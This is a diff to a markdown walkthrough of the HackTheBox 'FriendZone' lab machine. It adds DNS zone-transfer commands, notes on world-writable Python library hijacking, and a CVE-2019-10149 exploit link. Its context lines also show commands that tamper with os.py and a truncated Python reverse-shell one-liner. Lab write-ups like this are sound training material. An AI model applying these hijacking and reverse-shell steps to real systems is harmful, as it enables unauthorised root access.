@@ -183,7 +183,7 @@ dig axfr @10.10.10.123 friendzoneportal.red
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8824b51e-478e-49d0-9340-afdf8cf92c50)
 
-+ Alternatively, you can try the commands in the below:
++ **Alternatively**, you can try the commands in the below:
 ```
 host -l friendzone.red 10.10.10.123
 host -l friendzoneportal.red 10.10.10.123
@@ -191,13 +191,19 @@ host -l friendzoneportal.red 10.10.10.123
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/9039b9cb-a1fe-410e-af5e-531cfa506f2a)
 
++ **Alternatively 2**, specify query type:
+```
+host -t axfr friendzone.red friendzone.red
+host -t axfr friendzoneportal.red friendzoneportal.red 
+```
+
 + After these discovered subdomains, let's update hosts file for each of them.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/41fc16cd-582c-4049-9cf2-3860ebbf1d3a)
 
 + Check all of 8 subdomains visiting. Remember to visit them over both HTTP and HTTPS because it may give different results.
 ```
-friendzoneportal.red -> Michael Jackson's image
+friendzoneportal.red -> Known as the "King of Pop" Michael Jackson's image!
 administrator1.friendzone.red -> Login Form for FriendZone
 hr.friendzone.red -> Not Found
 uploads.friendzone.red -> upload page
@@ -207,7 +213,7 @@ imports.friendzoneportal.red -> Not Found
 vpn.friendzoneportal.red -> Not Found
 ```
 
-+ Visit `https://friendzoneportal.red`, and see Michael Jackson's image.
++ Visit `https://friendzoneportal.red`, and see **Known as the "King of Pop" Michael Jackson's image**!
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f3f025a0-5a0b-4b14-bc3e-0cd6eaf92f23)
 
@@ -456,6 +462,12 @@ db_name=FZ
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b2abbfe-097a-4f70-97d3-7fcf38beaf3c)
 
++ **Alternatively 3**: `stat /usr/lib/python2.7`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c6b8c66f-7399-4ae2-8215-78fe7c492a8e)
+
++ **/usr/lib/python2.7** is world-writable which means that even if os.py is not-writable by friend anyone can just replace it with their own malicious library.
+
 + Add the python reverse shell code to the bottom of the **os.py** file.
 + Remove **os** from **os.dup2()**, and just write **dup2()** since we're in the os module.
 + Check [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) about more.
@@ -486,13 +498,19 @@ echo 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6f1117a6-c15f-4b48-be4e-9782a51c2919)
 
 
-## Create A Bogus Python Library
+## Create A Bogus Python Library: An Alternative to Root Privilege Escalation
 + Taking privilege of python library, let's create a bogus python library named as os.py to call root flag through this file.
 ```
 cd /tmp
 echo "system ('cat /root/root.txt > /tmp/flag.txt')" >> /usr/lib/python2.7/os.py
 ```
 
+## One More Alternative Root Privilege Escalation
++ Check smtp port on the target's localhost: `netstat -ant | grep 25`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/99dcb078-442a-463b-a8b6-09b57ec37f26)
+
++ For more, you can try [CVE-2019-10149]: https://github.com/Diefunction/CVE-2019-10149, and [an alternative different approach](https://ivanitlearning.wordpress.com/2020/11/20/hackthebox-friendzone/).
 
 
 # References & Alternatives
@@ -508,5 +526,11 @@ echo "system ('cat /root/root.txt > /tmp/flag.txt')" >> /usr/lib/python2.7/os.py
 
 # Technical Knowledge
 + [Python Library Hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/): https://rastating.github.io/privilege-escalation-via-python-library-hijacking/
++ https://www.tutorialspoint.com/What-are-pyc-files-in-Python
 + https://ethicalhacs.com/admirer-hackthebox-walkthrough/
 + https://www.hackingarticles.in/hack-the-box-friendzone-walkthrough/
+
+
+# CVE Scripting
++ [CVE-2019-10149]: https://github.com/Diefunction/CVE-2019-10149
++ https://ivanitlearning.wordpress.com/2020/11/20/hackthebox-friendzone/
